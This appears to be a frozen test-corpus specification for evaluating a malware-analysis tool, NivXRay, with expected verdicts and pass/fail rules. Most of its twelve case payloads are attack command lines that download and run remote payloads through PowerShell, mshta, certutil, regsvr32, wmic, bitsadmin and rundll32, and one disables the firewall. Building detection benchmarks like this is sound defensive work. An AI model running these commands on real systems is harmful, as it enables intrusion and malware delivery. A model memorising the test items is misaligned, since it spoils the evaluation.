# Real-Investigation-Proof · Frozen Corpus & Pre-Registered Expectations

**Frozen at:** 2026-08-11 (before any NivXRay execution)
**Methodology:** ADR-0010e Phase A · public corpus + external-reference baseline
**Cardinality:** 12 cases
**Selection philosophy:** Cases were chosen from public, well-documented Living-Off-The-Land and offensive-tradecraft TTPs where an adjudicated public analysis (MITRE ATT&CK, LOLBAS project, vendor advisory, CISA/JPCERT/NCC/Elastic writeup) exists. Benign and ambiguous cases were **deliberately included** to test that NivXRay does not manufacture malicious verdicts. Cases requiring binary emulation, sandbox detonation, or full EDR telemetry (all of which are OUT of the LIVE product's stated capability envelope) were **excluded**.

> **Non-cherry-pick declaration:** This inventory was written before any NivXRay run and is treated as a pre-registered protocol. Cases will not be added, removed, or reworded after execution begins. Cases 6 and 9 in particular are structured so that the *correct* NivXRay response is "not malicious" or "insufficient evidence" — a NivXRay that scores well on the malicious cases but flunks these two is not a validated product.

---

## Selection criteria (pre-registered)

1. Public reference outcome MUST exist (MITRE technique ID + at least one non-vendor citation OR LOLBAS project entry OR CISA/JPCERT/NCC/US-CERT advisory).
2. Input MUST be a command line, script, or short document snippet — inputs the LIVE Workspace can ingest today via `/api/upload`.
3. Corpus MUST contain **at least 2 benign / non-malicious** cases and **at least 1 ambiguous** case.
4. Corpus MUST contain **at least 1 case designed to be too short/insufficient** to reach a verdict (falsification of over-claiming).
5. Corpus MUST contain **at least 1 multi-layer obfuscation** case (nested encoding).
6. Corpus MUST contain **at least 1 case NivXRay is expected to under-support** (documented capability gap) — honesty of failure surfacing.
7. No case may be drawn from `/app/backend/tests/fixtures/` (that corpus was curated by the team that built the analyzers → selection-bias-contaminated).

---

## Inventory (FROZEN)

| # | Case ID | Type | Expected verdict | Expected ATT&CK | Reference |
|---|---------|------|------------------|-----------------|-----------|
| 01 | `rip-01-ps-enc-launcher`   | Malicious       | malicious / high-suspicion  | T1059.001, T1027            | MITRE ATT&CK T1059.001; CISA AA22-320A |
| 02 | `rip-02-mshta-remote-hta`  | Malicious       | malicious / high-suspicion  | T1218.005                   | LOLBAS mshta; MITRE T1218.005 |
| 03 | `rip-03-certutil-urlcache` | Malicious       | malicious / high-suspicion  | T1105, T1140                | LOLBAS certutil; MITRE T1140 |
| 04 | `rip-04-squiblydoo`        | Malicious       | malicious / high-suspicion  | T1218.010                   | Casey Smith 2017; MITRE T1218.010 |
| 05 | `rip-05-wmic-process`      | Malicious       | suspicious / malicious      | T1047                       | MITRE T1047; Elastic writeup |
| 06 | `rip-06-benign-recon-ps`   | **Benign**      | benign / not malicious      | (none)                      | Standard admin command |
| 07 | `rip-07-netsh-fw-off`      | **Ambiguous**   | suspicious (with caveat)    | T1562.004                   | MITRE T1562.004 |
| 08 | `rip-08-nested-b64-ps`     | Malicious       | malicious / high-suspicion  | T1059.001, T1027, T1140     | MITRE T1027 |
| 09 | `rip-09-too-short`         | **Insufficient**| unable to determine / low   | (none required)             | Falsification of over-claim |
| 10 | `rip-10-empty-input`       | **Edge**        | unable to determine / reject| (none)                      | Falsification of empty-input handling |
| 11 | `rip-11-bitsadmin-transfer`| Malicious       | malicious / high-suspicion  | T1197, T1105                | MITRE T1197; LOLBAS bitsadmin |
| 12 | `rip-12-rundll32-poweliks` | Malicious       | malicious / high-suspicion  | T1218.011, T1059.007        | Symantec/GData Poweliks writeups; MITRE T1218.011 |

---

## Case payloads (byte-frozen)

### rip-01-ps-enc-launcher
```
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA
```
Base64 decodes to: `IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.5/payload.ps1')`

### rip-02-mshta-remote-hta
```
mshta.exe http://198.51.100.23/dropper.hta
```

### rip-03-certutil-urlcache
```
certutil.exe -urlcache -split -f http://203.0.113.15/payload.exe C:\Users\Public\update.exe
```

### rip-04-squiblydoo
```
regsvr32.exe /s /n /u /i:http://198.51.100.99/backdoor.sct scrobj.dll
```

### rip-05-wmic-process
```
wmic.exe /node:"WORKSTATION-04" process call create "cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.7/b.ps1')"
```

### rip-06-benign-recon-ps
```
Get-ChildItem -Path "C:\Users\jsmith\Documents" -Recurse -Include *.docx | Select-Object Name, Length, LastWriteTime | Export-Csv -Path "C:\Temp\docs.csv" -NoTypeInformation
```

### rip-07-netsh-fw-off
```
netsh advfirewall set allprofiles state off
```

### rip-08-nested-b64-ps
```
powershell -nop -w hidden -c "$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbCAtRW5jIFNRQkZBRmdBS0FCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFUZ0JsQUhRQUxnQlhBR1VBWWdCREFHd0FhUUJsQUc0QWRBQXBBQzRBUkFCdkFIY0FiZ0JzQUc4QVlRQmtBRk1BZEFCeUFHa0FiZ0JuQUNnQUp3Qm9BSFFBZEFCd0FEb0FMd0F2QURJQU1nQXpBQzRBTVRBQUxnQXhBRElBTHdCcEFHNEFad0FuQUNrQQ=='));iex $s"
```
Inner base64 decodes to another PowerShell `-Enc` payload targeting `http://223.10.12/in.g`.

### rip-09-too-short
```
dir
```

### rip-10-empty-input
```

```
(literal empty file)

### rip-11-bitsadmin-transfer
```
bitsadmin.exe /transfer job1 /priority foreground http://198.51.100.42/m.exe C:\ProgramData\m.exe
```

### rip-12-rundll32-poweliks
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write("\74script language=jscript>eval(new ActiveXObject(\"WScript.Shell\").RegRead(\"HKCU\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run\\\\evil\"));\74/script>")
```

---

## Pre-registered pass/fail criteria (per case)

For each case, NivXRay's output will be classified as:

- **PASS** — verdict aligns with expected, AND at least 1 of the expected ATT&CK techniques is surfaced (where any is expected), AND evidence chain is populated with at least 1 concrete artefact citing the original input.
- **PARTIAL** — verdict aligns OR at least 1 expected ATT&CK is surfaced, but not both, OR evidence chain is empty.
- **FAIL** — verdict misaligned with expected (false-positive on benign / ambiguous, false-negative on malicious, or over-confident on insufficient-input).
- **UNSUPPORTED** — NivXRay refuses input, produces a routing-only response, or returns a deterministic "not analysed" verdict without claiming a malicious conclusion. **UNSUPPORTED is not a failure**, it is an honest capability boundary.

Reproducibility per case:

- **DETERMINISTIC** — second run produces byte-identical `verdict.label`, `verdict.confidence` bucket (rounded to nearest 0.1), and identical ATT&CK technique set.
- **STOCHASTIC** — any of the above drifts across two identical runs.

**Overall Phase-A verdict** — computed after execution, not pre-declared. The decision-gate (PROMOTE / HOLD / REDIRECT / STOP for P2) will be assigned based on the observed matrix, following rules defined in ADR-0010e.
